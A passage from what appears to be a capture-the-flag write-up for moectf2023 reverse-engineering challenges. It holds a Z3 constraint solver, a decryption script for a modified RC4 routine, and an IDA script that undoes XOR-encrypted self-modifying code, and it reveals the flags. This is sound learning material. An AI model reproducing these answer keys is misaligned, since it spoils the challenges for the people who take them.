class="number">637650</span>)</span><br><span class="line">s.add(<span class="number">278</span> * v4[<span class="number">29</span>]+ <span class="number">169</span> * v4[<span class="number">28</span>]+ <span class="number">62</span> * v4[<span class="number">27</span>]+ <span class="number">119</span> * v4[<span class="number">26</span>]+ <span class="number">385</span> * v4[<span class="number">25</span>]+ <span class="number">289</span> * v4[<span class="number">24</span>]+ <span class="number">344</span> * v4[<span class="number">23</span>]+ <span class="number">45</span> * v4[<span class="number">20</span>]+ <span class="number">308</span> * v4[<span class="number">19</span>]+ <span class="number">318</span> * v4[<span class="number">18</span>]+ <span class="number">270</span> * v4[<span class="number">17</span>]+ v4[<span class="number">16</span>]+ <span class="number">323</span> * v4[<span class="number">15</span>]+ <span class="number">332</span> * v4[<span class="number">14</span>]+ <span class="number">287</span> * v4[<span class="number">11</span>]+ <span class="number">170</span> * v4[<span class="number">10</span>]+ <span class="number">163</span> * v4[<span class="number">9</span>]+ <span class="number">301</span> * v4[<span class="number">8</span>]+ <span class="number">303</span> * v4[<span class="number">7</span>]+ <span class="number">23</span> * v4[<span class="number">6</span>]+ <span class="number">327</span> * v4[<span class="number">5</span>]+ <span class="number">169</span> * v4[<span class="number">3</span>]+ <span class="number">28</span> * v4[<span class="number">0</span>]+ <span class="number">365</span> * v4[<span class="number">1</span>]+ <span class="number">15</span> * v4[<span class="number">2</span>]+ <span class="number">352</span> * v4[<span class="number">12</span>]+ <span class="number">72</span> * v4[<span class="number">13</span>]+ <span class="number">140</span> * v4[<span class="number">21</span>]+ <span class="number">65</span> * v4[<span class="number">22</span>]+ <span class="number">346</span> * v4[<span class="number">30</span>] == <span class="number">572609</span>)</span><br><span class="line">s.add(<span class="number">147</span> * v4[<span class="number">29</span>]+ <span class="number">88</span> * v4[<span class="number">28</span>]+ <span class="number">143</span> * v4[<span class="number">27</span>]+ <span class="number">237</span> * v4[<span class="number">26</span>]+ <span class="number">63</span> * v4[<span class="number">24</span>]+ <span class="number">281</span> * v4[<span class="number">22</span>]+ <span class="number">388</span> * v4[<span class="number">21</span>]+ <span class="number">142</span> * v4[<span class="number">20</span>]+ <span class="number">208</span> * v4[<span class="number">19</span>]+ <span class="number">60</span> * v4[<span class="number">18</span>]+ <span class="number">354</span> * v4[<span class="number">15</span>]+ <span class="number">88</span> * v4[<span class="number">14</span>]+ <span class="number">146</span> * v4[<span class="number">13</span>]+ <span class="number">290</span> * v4[<span class="number">12</span>]+ <span class="number">349</span> * v4[<span class="number">11</span>]+ <span class="number">43</span> * v4[<span class="number">10</span>]+ <span class="number">230</span> * v4[<span class="number">9</span>]+ <span class="number">267</span> * v4[<span class="number">6</span>]+ <span class="number">136</span> * v4[<span class="number">5</span>]+ <span class="number">383</span> * v4[<span class="number">4</span>]+ <span class="number">35</span> * v4[<span class="number">3</span>]+ <span class="number">226</span> * v4[<span class="number">2</span>]+ <span class="number">385</span> * v4[<span class="number">1</span>]+ <span class="number">238</span> * v4[<span class="number">0</span>]+ <span class="number">348</span> * v4[<span class="number">7</span>]+ <span class="number">20</span> * v4[<span class="number">8</span>]+ <span class="number">158</span> * v4[<span class="number">16</span>]+ <span class="number">21</span> * v4[<span class="number">17</span>]+ <span class="number">249</span> * v4[<span class="number">23</span>]+ <span class="number">9</span> * v4[<span class="number">25</span>]+ <span class="number">343</span> * v4[<span class="number">30</span>] == <span class="number">603481</span>)</span><br><span class="line">s.add(<span class="number">29</span> * v4[<span class="number">29</span>]+ <span class="number">323</span> * v4[<span class="number">26</span>]+ <span class="number">159</span> * v4[<span class="number">25</span>]+ <span class="number">118</span> * v4[<span class="number">20</span>]+ <span class="number">326</span> * v4[<span class="number">19</span>]+ <span class="number">211</span> * v4[<span class="number">18</span>]+ <span class="number">225</span> * v4[<span class="number">17</span>]+ <span class="number">355</span> * v4[<span class="number">16</span>]+ <span class="number">201</span> * v4[<span class="number">15</span>]+ <span class="number">149</span> * v4[<span class="number">14</span>]+ <span class="number">296</span> * v4[<span class="number">13</span>]+ <span class="number">184</span> * v4[<span class="number">12</span>]+ <span class="number">315</span> * v4[<span class="number">11</span>]+ <span class="number">364</span> * v4[<span class="number">10</span>]+ <span class="number">142</span> * v4[<span class="number">9</span>]+ <span class="number">75</span> * v4[<span class="number">8</span>]+ <span class="number">313</span> * v4[<span class="number">7</span>]+ <span class="number">142</span> * v4[<span class="number">6</span>]+ <span class="number">396</span> * v4[<span class="number">5</span>]+ <span class="number">348</span> * v4[<span class="number">4</span>]+ <span class="number">272</span> * v4[<span class="number">3</span>]+ <span class="number">26</span> * v4[<span class="number">2</span>]+ <span class="number">206</span> * v4[<span class="number">1</span>]+ <span class="number">173</span> * v4[<span class="number">0</span>]+ <span class="number">155</span> * v4[<span class="number">21</span>]+ <span class="number">144</span> * v4[<span class="number">22</span>]+ <span class="number">366</span> * v4[<span class="number">23</span>]+ <span class="number">257</span> * v4[<span class="number">24</span>]+ <span class="number">148</span> * v4[<span class="number">27</span>]+ <span class="number">24</span> * v4[<span class="number">28</span>]+ <span class="number">253</span> * v4[<span class="number">30</span>] == <span class="number">664504</span>)</span><br><span class="line">s.add(<span class="number">4</span> * v4[<span class="number">29</span>]+ <span class="number">305</span> * v4[<span class="number">28</span>]+ <span class="number">226</span> * v4[<span class="number">27</span>]+ <span class="number">212</span> * v4[<span class="number">26</span>]+ <span class="number">175</span> * v4[<span class="number">25</span>]+ <span class="number">93</span> * v4[<span class="number">24</span>]+ <span class="number">165</span> * v4[<span class="number">23</span>]+ <span class="number">341</span> * v4[<span class="number">20</span>]+ <span class="number">14</span> * v4[<span class="number">19</span>]+ <span class="number">394</span> * v4[<span class="number">18</span>]+ (v4[<span class="number">17</span>] * <span class="number">2</span> ** <span class="number">8</span>)+ <span class="number">252</span> * v4[<span class="number">16</span>]+ <span class="number">336</span> * v4[<span class="number">15</span>]+ <span class="number">38</span> * v4[<span class="number">14</span>]+ <span class="number">82</span> * v4[<span class="number">13</span>]+ <span class="number">155</span> * v4[<span class="number">12</span>]+ <span class="number">215</span> * v4[<span class="number">11</span>]+ <span class="number">331</span> * v4[<span class="number">10</span>]+ <span class="number">230</span> * v4[<span class="number">9</span>]+ <span class="number">241</span> * v4[<span class="number">8</span>]+ <span class="number">225</span> * v4[<span class="number">7</span>]+ <span class="number">186</span> * v4[<span class="number">4</span>]+ <span class="number">90</span> * v4[<span class="number">3</span>]+ <span class="number">50</span> * v4[<span class="number">2</span>]+ <span class="number">62</span> * v4[<span class="number">1</span>]+ <span class="number">34</span> * v4[<span class="number">0</span>]+ <span class="number">237</span> * v4[<span class="number">5</span>]+ <span class="number">11</span> * v4[<span class="number">6</span>]+ <span class="number">336</span> * v4[<span class="number">21</span>]+ <span class="number">36</span> * v4[<span class="number">22</span>]+ <span class="number">29</span> * v4[<span class="number">30</span>] == <span class="number">473092</span>)</span><br><span class="line">s.add(<span class="number">353</span> * v4[<span class="number">29</span>]+ <span class="number">216</span> * v4[<span class="number">28</span>]+ <span class="number">252</span> * v4[<span class="number">27</span>]+ <span class="number">8</span> * v4[<span class="number">26</span>]+ <span class="number">62</span> * v4[<span class="number">25</span>]+ <span class="number">233</span> * v4[<span class="number">24</span>]+ <span class="number">254</span> * v4[<span class="number">23</span>]+ <span class="number">303</span> * v4[<span class="number">22</span>]+ <span class="number">234</span> * v4[<span class="number">21</span>]+ <span class="number">303</span> * v4[<span class="number">20</span>]+ (v4[<span class="number">19</span>] * <span class="number">2</span> ** <span class="number">8</span>)+ <span class="number">148</span> * v4[<span class="number">18</span>]+ <span class="number">324</span> * v4[<span class="number">17</span>]+ <span class="number">317</span> * v4[<span class="number">16</span>]+ <span class="number">213</span> * v4[<span class="number">15</span>]+ <span class="number">309</span> * v4[<span class="number">14</span>]+ <span class="number">28</span> * v4[<span class="number">13</span>]+ <span class="number">280</span> * v4[<span class="number">11</span>]+ <span class="number">118</span> * v4[<span class="number">10</span>]+ <span class="number">58</span> * v4[<span class="number">9</span>]+ <span class="number">50</span> * v4[<span class="number">8</span>]+ <span class="number">155</span> * v4[<span class="number">7</span>]+ <span class="number">161</span> * v4[<span class="number">6</span>]+ (v4[<span class="number">5</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">303</span> * v4[<span class="number">4</span>]+ <span class="number">76</span> * v4[<span class="number">3</span>]+ <span class="number">43</span> * v4[<span class="number">2</span>]+ <span class="number">109</span> * v4[<span class="number">1</span>]+ <span class="number">102</span> * v4[<span class="number">0</span>]+ <span class="number">93</span> * v4[<span class="number">30</span>] == <span class="number">497492</span>)</span><br><span class="line">s.add(<span class="number">89</span> * v4[<span class="number">29</span>]+ <span class="number">148</span> * v4[<span class="number">28</span>]+ <span class="number">82</span> * v4[<span class="number">27</span>]+ <span class="number">53</span> * v4[<span class="number">26</span>]+ <span class="number">274</span> * v4[<span class="number">25</span>]+ <span class="number">220</span> * v4[<span class="number">24</span>]+ <span class="number">202</span> * v4[<span class="number">23</span>]+ <span class="number">123</span> * v4[<span class="number">22</span>]+ <span class="number">231</span> * v4[<span class="number">21</span>]+ <span class="number">169</span> * v4[<span class="number">20</span>]+ <span class="number">278</span> * v4[<span class="number">19</span>]+ <span class="number">259</span> * v4[<span class="number">18</span>]+ <span class="number">208</span> * v4[<span class="number">17</span>]+ <span class="number">219</span> * v4[<span class="number">16</span>]+ <span class="number">371</span> * v4[<span class="number">15</span>]+ <span class="number">181</span> * v4[<span class="number">12</span>]+ <span class="number">104</span> * v4[<span class="number">11</span>]+ <span class="number">392</span> * v4[<span class="number">10</span>]+ <span class="number">285</span> * v4[<span class="number">9</span>]+ <span class="number">113</span> * v4[<span class="number">8</span>]+ <span class="number">298</span> * v4[<span class="number">7</span>]+ <span class="number">389</span> * v4[<span class="number">6</span>]+ <span class="number">322</span> * v4[<span class="number">5</span>]+ <span class="number">338</span> * v4[<span class="number">4</span>]+ <span class="number">237</span> * v4[<span class="number">3</span>]+ <span class="number">234</span> * v4[<span class="number">0</span>]+ <span class="number">261</span> * v4[<span class="number">1</span>]+ <span class="number">10</span> * v4[<span class="number">2</span>]+ <span class="number">345</span> * v4[<span class="number">13</span>]+ <span class="number">3</span> * v4[<span class="number">14</span>]+ <span class="number">361</span> * v4[<span class="number">30</span>] == <span class="number">659149</span>)</span><br><span class="line">s.add(<span class="number">361</span> * v4[<span class="number">29</span>]+ <span class="number">359</span> * v4[<span class="number">28</span>]+ <span class="number">93</span> * v4[<span class="number">27</span>]+ <span class="number">315</span> * v4[<span class="number">26</span>]+ <span class="number">69</span> * v4[<span class="number">25</span>]+ <span class="number">137</span> * v4[<span class="number">24</span>]+ <span class="number">69</span> * v4[<span class="number">23</span>]+ <span class="number">58</span> * v4[<span class="number">22</span>]+ <span class="number">300</span> * v4[<span class="number">21</span>]+ <span class="number">371</span> * v4[<span class="number">20</span>]+ <span class="number">264</span> * v4[<span class="number">19</span>]+ <span class="number">317</span> * v4[<span class="number">18</span>]+ <span class="number">215</span> * v4[<span class="number">17</span>]+ <span class="number">155</span> * v4[<span class="number">16</span>]+ <span class="number">215</span> * v4[<span class="number">15</span>]+ <span class="number">330</span> * v4[<span class="number">14</span>]+ <span class="number">239</span> * v4[<span class="number">13</span>]+ <span class="number">212</span> * v4[<span class="number">12</span>]+ <span class="number">88</span> * v4[<span class="number">11</span>]+ <span class="number">82</span> * v4[<span class="number">10</span>]+ <span class="number">354</span> * v4[<span class="number">9</span>]+ <span class="number">85</span> * v4[<span class="number">8</span>]+ <span class="number">310</span> * v4[<span class="number">7</span>]+ <span class="number">84</span> * v4[<span class="number">6</span>]+ <span class="number">374</span> * v4[<span class="number">5</span>]+ <span class="number">380</span> * v4[<span class="number">4</span>]+ <span class="number">215</span> * v4[<span class="number">3</span>]+ <span class="number">351</span> * v4[<span class="number">2</span>]+ <span class="number">141</span> * v4[<span class="number">1</span>]+ <span class="number">115</span> * v4[<span class="number">0</span>]+ <span class="number">108</span> * v4[<span class="number">30</span>] == <span class="number">629123</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> v4:</span><br><span class="line">    	<span class="keyword">if</span> (<span class="built_in">str</span>(m[v]) == <span class="string">&#x27;None&#x27;</span>):<span class="keyword">continue</span></span><br><span class="line">        i = m[v]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(i))),end=<span class="string">&quot;&quot;</span>) // i是<span class="built_in">int</span> ref,需要转<span class="built_in">str</span>然后转<span class="built_in">int</span></span><br></pre></td></tr></table></figure>



<h2 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400795E0</span><span class="params">(__int64 a1, __int64 a2, __int64 inputString, <span class="type">int</span> a4, __int64 key, <span class="type">unsigned</span> <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line"></span><br><span class="line">  result = sub_14007555C(&amp;unk_1401A7007);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = i;</span><br><span class="line">    *(_BYTE *)(a2 + i) = *(_BYTE *)(key + i % a6);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (*(<span class="type">unsigned</span> __int8 *)(a2 + j) + *(<span class="type">unsigned</span> __int8 *)(a1 + j) + v10) % <span class="number">256</span>;</span><br><span class="line">    v12 = *(_BYTE *)(a1 + v10);</span><br><span class="line">    *(_BYTE *)(a1 + v10) = *(_BYTE *)(a1 + j);</span><br><span class="line">    *(_BYTE *)(a1 + j) = v12;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(j + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v11 = (*(<span class="type">unsigned</span> __int8 *)(a1 + v9) + v11) % <span class="number">256</span>;</span><br><span class="line">    v13 = *(_BYTE *)(a1 + v11);</span><br><span class="line">    *(_BYTE *)(a1 + v11) = *(_BYTE *)(a1 + v9);</span><br><span class="line">    *(_BYTE *)(a1 + v9) = v13;</span><br><span class="line">    *(_BYTE *)(inputString + v14++) ^= *(_BYTE *)(a1</span><br><span class="line">                                                + (*(<span class="type">unsigned</span> __int8 *)(a1 + v11) + *(<span class="type">unsigned</span> __int8 *)(a1 + v9)) % <span class="number">256</span>);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)--a4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化数组 产生一个s盒 异或上s盒 是rc4的特征，不过不是标准的rc4，所以需要跟着逻辑写一下然后解密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a1[<span class="number">256</span>], a2[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a3[] = &#123;</span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x9B</span>, <span class="number">0xFB</span>, <span class="number">0x19</span>, <span class="number">0x06</span>, <span class="number">0x6A</span>, <span class="number">0xB5</span>, <span class="number">0x3B</span>, <span class="number">0x7C</span>, <span class="number">0xBA</span>, <span class="number">0x03</span>, <span class="number">0xF3</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0xB6</span>,</span><br><span class="line">        <span class="number">0x3D</span>, <span class="number">0x8A</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x2E</span>, <span class="number">0x50</span>, <span class="number">0x11</span>, <span class="number">0xE7</span>, <span class="number">0xC7</span>, <span class="number">0x4F</span>, <span class="number">0xB1</span>, <span class="number">0x27</span>, <span class="number">0xCF</span>, <span class="number">0xF3</span>, <span class="number">0xAE</span>,</span><br><span class="line">        <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xB2</span>, <span class="number">0x08</span>, <span class="number">0xFB</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> a4 = <span class="number">38</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;moectf2023&quot;</span>;</span><br><span class="line">    <span class="type">int</span> a6 = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> v9 = <span class="number">0</span>, v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v13 = <span class="number">0</span>, v14 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        a1[i] = i;</span><br><span class="line">        a2[i] = key[i % a6];</span><br><span class="line">        result = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">        v10 = (a2[j] + a1[j] + v10) % <span class="number">256</span>;</span><br><span class="line">        <span class="type">int</span> v12 = a1[v10];</span><br><span class="line">        a1[v10] = a1[j];</span><br><span class="line">        a1[j] = v12;</span><br><span class="line">        result = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (a4) &#123;</span><br><span class="line">        v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v11 = (a1[v9] + v11) % <span class="number">256</span>;</span><br><span class="line">        v13 = a1[v11];</span><br><span class="line">        a1[v11] = a1[v9];</span><br><span class="line">        a1[v9] = v13;</span><br><span class="line">        a3[v14] ^= a1[(a1[v11] + a1[v9]) % <span class="number">256</span>];</span><br><span class="line">        v14++;</span><br><span class="line">        a4--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a3); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, a3[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ascii解密拿到flag moectf{y0u_r3a11y_understand_rc4!!!!}</p>
<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>Self-Modifying Code顾名思义，工作起来分三步，编译的时候将函数的字节码加密插入程序，然后用VirtualProtect修改内存的保护(text段修改成可写的)，然后运行解密函数将这个函数解密</p>
<p>查询了一下，大多数smc相关的题目有关字节码加密的操作使用异或的挺多的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401087(aPlzInputYourFl, v4);</span><br><span class="line">  sub_401023(aS, (<span class="type">char</span>)v6);</span><br><span class="line">  sub_4011E0();</span><br><span class="line">  <span class="keyword">if</span> ( sub_401050(v6) )</span><br><span class="line">    sub_401087(aGood, v5);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_401087(aTryAgainPlease, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面的是vfprint和vfscanf</p>
<p>sub_4011E0(); return了一个 sub_401550()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_401550()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+4h] [ebp-1Ch]</span><br><span class="line">  DWORD flOldProtect[<span class="number">2</span>]; // [esp+18h] [ebp-8h] BYREF</span><br><span class="line"></span><br><span class="line">  flOldProtect[<span class="number">1</span>] = -<span class="number">858993460</span>;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = (DWORD)malloc(8u);</span><br><span class="line">  result = VirtualProtect((char *)&amp;loc_4014D0 - (unsigned <span class="built_in">int</span>)&amp;loc_4014D0 % <span class="number">0x1000</span>, 0x1000u, 0x80u, flOldProtect);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">122</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)&amp;loc_4014D0 + i) ^= 0x66u;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>VirtualProtect修改了内存页的权限，可读可写可执行，并填充0xcccc初始化了，然后下面loc_4014D0 按字节异或0x66u 122次</p>
<p>使用ida中的script command把0x4014D0以及往后的121个字节处理一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4014D0</span>,<span class="number">0x40154a</span>):</span><br><span class="line">    patch_byte(i,get_wide_byte(i)^<span class="number">0x66</span>)</span><br></pre></td></tr></table></figure>

<p>出现了push ebp，下面的全是db,转成数组然后转code转function，注意第一个db的位置是4014D1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl sub_4014D1(<span class="built_in">int</span> a1, char *Str)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+0h] [ebp-8h]</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((unsigned __int8)(Str[i] + <span class="number">57</span>) ^ <span class="number">0x39</span>) != (unsigned __int8)byte_40A000[i] )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在if中是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_401050</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMPOUT(<span class="number">0x4014D0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只需要把byte_40A000[i]异或一遍0x39 -57然后转ascii就能拿到flag</p>
